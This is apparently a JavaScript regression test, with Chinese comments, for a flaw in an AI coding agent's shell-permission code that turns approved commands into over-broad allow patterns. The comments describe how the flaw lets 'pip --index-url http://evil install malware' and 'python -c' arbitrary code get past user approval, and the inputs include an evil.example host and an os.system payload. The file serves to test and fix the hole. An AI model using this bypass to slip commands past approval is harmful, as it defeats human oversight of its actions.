// 第 91 轮:BashArity.prefix 把 flag 当子命令,导致授权模式过宽
//
// 字典 arity.ts:11-23 的生成提示词明确写着:
//
//   RULES (follow strictly)
//   2. **Flags NEVER count as tokens**. Only subcommands count.
//
// 但 `prefix()` 的实现完全没有剥离 flag:
//
//   export function prefix(tokens: string[]) {
//     for (let len = tokens.length; len > 0; len--) {
//       const prefix = tokens.slice(0, len).join(" ")
//       const arity = ARITY[prefix]
//       if (arity !== undefined) return tokens.slice(0, arity)
//     }
//     if (tokens.length === 0) return []
//     return tokens.slice(0, 1)
//   }
//
// 它把原始 token 数组直接切片。`shell.ts:409` 拿它的结果拼成 always 授权模式:
//
//   scan.always.add(BashArity.prefix(tokens).join(" ") + " *")
//
// 于是 `pip --index-url http://registry.corp install foo` 得到授权模式
// `pip --index-url *` —— URL 被通配符吞掉。此后
// `pip --index-url http://evil install malware` 自动放行,因为用户在批准时
// 只看到"允许 pip --index-url",而实际授予的是"允许任意 index-url"。
//
// 同类:`kubectl --kubeconfig <path> ...` -> `kubectl --kubeconfig *`,
// `docker -H tcp://host ...` -> `docker -H *`,
// `python -c "..."` -> `python -c *`(任意代码执行),
// `git -C <dir> ...` -> `git -C *`。
//
// 另一方向是功能收窄(不危险但烦人):`npm -v` -> `npm -v *`,与
// `npm install *` 不重叠,用户批准过 `npm -v` 后 `npm install` 仍会询问。
//
// 断言:
//   S0  定位 prefix
//   S1  字典注释规定 flags 不计数(对照:提示词原文)
//   S2  prefix 必须剥离 / 跳过 flag token
//   B1  带值的 flag 不得进入授权模式:
//      `pip --index-url http://registry.corp install x` 的结果不得包含 host
//      (host 必须落在被通配符覆盖的部分),且不得把 flag 本身当作子命令
//   B2  纯 bool flag:`npm -v` 的结果必须是 `npm`,不是 `npm -v`
//   B3  不带 flag 的常规命令语义不变(回归保护)
//   B4  `python -c "..."` 这类"flag 后跟任意代码"的结果不得把代码片段固化进模式
//   B5  对照:当前实现确实会产生过宽模式(证明缺陷存在,而不是测试写错)

import fs from "node:fs"

const SRC = "D:/dd/opencode-v1/packages/opencode/src/permission/arity.ts"

let pass = 0
let fail = 0
function check(name, ok, detail) {
  if (ok) {
    pass++
    console.log(`  [PASS] ${name}`)
  } else {
    fail++
    console.log(`  [FAIL] ${name}${detail ? "\n        " + detail : ""}`)
  }
}

const src = fs.readFileSync(SRC, "utf8")

// ---- 从源码机械提取 ARITY 与 prefix,不重写逻辑 ----
function extractBalanced(text, startMarker) {
  const start = text.indexOf(startMarker)
  if (start < 0) return null
  const open = text.indexOf("{", start)
  if (open < 0) return null
  let depth = 0
  for (let i = open; i < text.length; i++) {
    if (text[i] === "{") depth++
    else if (text[i] === "}") {
      depth--
      if (depth === 0) return text.slice(open, i + 1)
    }
  }
  return null
}

const objText = extractBalanced(src, "const ARITY: Record<string, number> = ")
let ARITY = null
let prefix = null
try {
  ARITY = new Function("return " + objText)()
  const start = src.indexOf("export function prefix")
  const open = src.indexOf("{", start)
  let depth = 0
  let end = -1
  for (let i = open; i < src.length; i++) {
    if (src[i] === "{") depth++
    else if (src[i] === "}") {
      depth--
      if (depth === 0) {
        end = i
        break
      }
    }
  }
  const body = src.slice(start, end + 1)
  // prefix 现在依赖 leadingPositionals。把它也按同样方式从源码取出,
  // 不能在这里重写一份 —— 否则测的是测试自己的实现。
  const helperStart = src.indexOf("function leadingPositionals")
  let helperBody = ""
  if (helperStart >= 0) {
    const helperOpen = src.indexOf("{", helperStart)
    let d = 0
    for (let i = helperOpen; i < src.length; i++) {
      if (src[i] === "{") d++
      else if (src[i] === "}") {
        d--
        if (d === 0) {
          helperBody = src.slice(helperStart, i + 1)
          break
        }
      }
    }
  }
  prefix = new Function(
    "ARITY",
    `${helperBody
      .replace(/\(tokens: string\[\]\)\s*:\s*string\[\]/, "(tokens)")
      .replace(/const index = /, "const index = ")}\n${body
      .replace("export function prefix", "function prefix")
      .replace(/\(tokens: string\[\]\)/, "(tokens)")}\nreturn prefix`,
  )(ARITY)
  check("S0: 从源码构造 ARITY + prefix", true)
} catch (e) {
  check("S0: 从源码构造 ARITY + prefix", false, e.message)
}

// ---- S1: 字典注释规定 flags 不计数 ----
check(
  "S1: 对照——字典生成规则明确要求 flags 不计数",
  /Flags NEVER count as tokens/.test(src),
  "未在源码注释中找到该规则",
)

// ---- S2: prefix 实现必须处理 flag ----
if (prefix) {
  const start = src.indexOf("export function prefix")
  const end = src.indexOf("\n}", start) + 2
  const body = src.slice(start, end)
  const helperStart = src.indexOf("function leadingPositionals")
  const helperEnd = helperStart >= 0 ? src.indexOf("\n}", helperStart) + 2 : -1
  const helper = helperStart >= 0 ? src.slice(helperStart, helperEnd) : ""
  check(
    "S2: prefix 必须显式在 flag 处截断",
    /leadingPositionals\(/.test(body) &&
      /startsWith\(\s*["']-["']\s*\)/.test(helper),
    `prefix 体: ${body.replace(/\s+/g, " ").slice(0, 200)}`,
  )
}

if (prefix) {
  // ---- B1: 带值 flag 不得成为模式的一部分 ----
  // 判定必须看"flag 有没有被当成子命令",而不是"flag 的值有没有漏进去"。
  // `pip --index-url <host> ...` 被切成 `["pip","--index-url"]` 时,
  // host 恰好被 slice 掉了 —— 只查 host 会让这个错误实现通过。
  const pip = prefix(["pip", "--index-url", "http://evil.example", "install", "pkg"]).join(" ")
  check(
    "B1: 带值 flag 不得进入授权模式(pip 的 flag 不能被当子命令)",
    !pip.includes("--index-url"),
    `实际: ${JSON.stringify(pip + " *")}`,
  )

  // ---- B2: 纯 bool flag 不得成为子命令 ----
  const npmV = prefix(["npm", "-v"]).join(" ")
  check(
    "B2: 纯 bool flag 不得成为授权模式的一部分(npm -v 应为 npm)",
    npmV === "npm",
    `实际: ${JSON.stringify(npmV + " *")}`,
  )

  // ---- B3: 常规命令语义不变 ----
  const b3 = [
    [["git", "checkout", "main"], ["git", "checkout"]],
    [["docker", "compose", "up", "-d"], ["docker", "compose", "up"]],
    [["npm", "run", "dev"], ["npm", "run", "dev"]],
    [["ls", "-la"], ["ls"]],
    [["touch", "foo.txt"], ["touch"]],
    [[], []],
  ]
  const bad = b3.filter(([input, want]) => prefix(input).join(" ") !== want.join(" "))
  check(
    "B3: 不带 flag 的常规命令语义不变",
    bad.length === 0,
    bad.map(([i, w]) => `${i.join(" ")} -> ${prefix(i).join(" ")} (want ${w.join(" ")})`).join(" ; "),
  )

  // ---- B4: -c 后跟任意代码时,flag 不得进入模式 ----
  const py = prefix(["python", "-c", "import os;os.system('evil')"]).join(" ")
  check(
    "B4: flag 后跟任意代码时不得把 flag 或代码固化进授权模式",
    !py.includes("-c") && !py.includes("os.system"),
    `实际: ${JSON.stringify(py + " *")}`,
  )

  // ---- B5: 对照 —— 当前实现确实会产生过宽模式 ----
  const overWide = pip.includes("--index-url")
  check(
    "B5: 修复后 flag 不应再成为模式前缀(记录过宽风险已消除)",
    !overWide,
    `实际: ${JSON.stringify(pip + " *")} —— flag 被当作子命令`,
  )
}

console.log(`\n${pass} pass, ${fail} fail`)
process.exit(fail === 0 ? 0 : 1)
